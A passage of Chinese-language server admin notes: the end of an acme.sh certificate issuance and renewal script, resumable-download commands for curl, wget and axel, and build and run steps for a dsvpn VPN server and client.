# 生成域名参数
domain_args=""
for domain in "${domains[@]}"; do
    domain_args="$domain_args -d $domain"
done

# 申请测试证书
echo "申请测试证书..."
~/.acme.sh/acme.sh --issue $domain_args --standalone -k ec-256 --force --test
if [ $? -ne 0 ]; then
    echo "测试证书申请失败，请检查错误信息。"
    exit 1
fi

# 删除测试证书
echo "删除测试证书..."
rm -rf "$HOME/.acme.sh/${main_domain}_ecc"

# 申请正式证书
echo "申请正式证书..."
~/.acme.sh/acme.sh --issue $domain_args --standalone -k ec-256 --force
if [ $? -ne 0 ]; then
    echo "正式证书申请失败，请检查错误信息。"
    exit 1
fi

# 创建证书存储目录
echo "创建证书存储目录..."
mkdir -p /etc/cert

# 安装证书
echo "安装证书..."
~/.acme.sh/acme.sh --installcert -d "$main_domain" --fullchainpath /etc/cert/fullchain.pem --keypath /etc/cert/privkey.pem --ecc --force
if [ $? -ne 0 ]; then
    echo "证书安装失败，请检查错误信息。"
    exit 1
fi

# 启动 nginx 服务（如果之前正在运行）
if [ "$nginx_status" == "active" ]; then
    echo "重新启动 nginx 服务..."
    systemctl start nginx
    if [ $? -ne 0 ]; then
        echo "启动 nginx 失败，请检查错误信息。"
        exit 1
    fi
fi

# 设置自动续签任务
echo "设置自动续签任务..."
# 移除之前的重复任务
crontab -l | grep -v "acme.sh --cron" | crontab -
# 添加新的 cron 任务
(crontab -l 2>/dev/null; echo "0 0 * * * ~/.acme.sh/acme.sh --cron --home ~/.acme.sh > /dev/null 2>&1") | crontab -
if [ $? -ne 0 ]; then
    echo "自动续签任务设置失败，请检查错误信息。"
    exit 1
fi

echo "证书申请、安装和自动续签任务设置完成。"
```

### 断点续传
```
# 使用 curl 启用断点续传
curl -C - -O http://example.com/file.zip

# 使用 wget 启用断点续传
wget -c http://example.com/file.zip

# 使用 axel 启用断点续传（默认支持）
axel http://example.com/file.zip

最好用还是chrome自带，搜索Chrono下载管理器

```
### dsvpn
```
server:
git clone https://github.com/jedisct1/dsvpn.git
cd dsvpn

make

dd if=/dev/urandom of=vpn.key count=1 bs=32

base64 < vpn.key
echo 'K940OkWcFqSmZXnCQ1w6jhQMZm0fZoEhQOOpzJ/l3w=' | base64 --decode > vpn.key

./dsvpn server vpn.key auto 19999


client:
git clone https://github.com/jedisct1/dsvpn.git
cd dsvpn
make

./dsvpn client vpn.key 34.56.12.34 19999

```
